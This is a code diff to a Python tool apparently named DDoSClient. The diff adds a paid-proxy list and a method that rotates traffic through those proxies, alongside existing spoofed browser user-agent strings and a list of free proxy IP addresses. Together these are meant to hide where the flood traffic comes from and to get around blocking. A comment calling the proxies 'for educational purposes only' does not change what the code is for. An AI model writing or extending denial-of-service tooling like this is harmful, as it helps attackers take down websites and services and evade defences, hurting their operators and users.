@@ -25,8 +25,21 @@ USER_AGENTS = [
     "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15",
 ]
 
-# Sample free proxies
-# WARNING: These may not work and can be unreliable
+# ======================================================
+# PAID PROXIES SECTION
+# ======================================================
+# Add your paid proxies here in the format:
+# "http://username:password@proxy_host:port" or "http://proxy_host:port"
+PAID_PROXIES = [
+    # Example formats:
+    # "http://user:pass@proxy1.example.com:8080",
+    # "http://proxy2.example.com:8080",
+    # "https://proxy3.example.com:443",
+]
+
+# ======================================================
+# SAMPLE FREE PROXIES (for educational purposes only)
+# ======================================================
 SAMPLE_FREE_PROXIES = [
     "http://103.152.112.172:80",
     "http://103.216.51.201:80",
@@ -103,6 +116,17 @@ class DDoSClient:
             print(f"[INFO] Configured {len(proxy_list)} proxies for rotation")
         else:
             self.proxy_cycle = None
+
+    def use_paid_proxies(self):
+        """Use paid proxies from the PAID_PROXIES list"""
+        if not PAID_PROXIES:
+            print("[WARNING] No paid proxies configured in PAID_PROXIES list!")
+            print("[INFO] Please add your paid proxies to the PAID_PROXIES list in the code.")
+            return False
+
+        self.set_proxies(PAID_PROXIES)
+        print(f"[INFO] Using {len(PAID_PROXIES)} paid proxies for IP rotation")
+        return True
 
     def test_proxy_connectivity(self, proxy_url: str, test_url: str = "http://httpbin.org/ip") -> bool:
         """
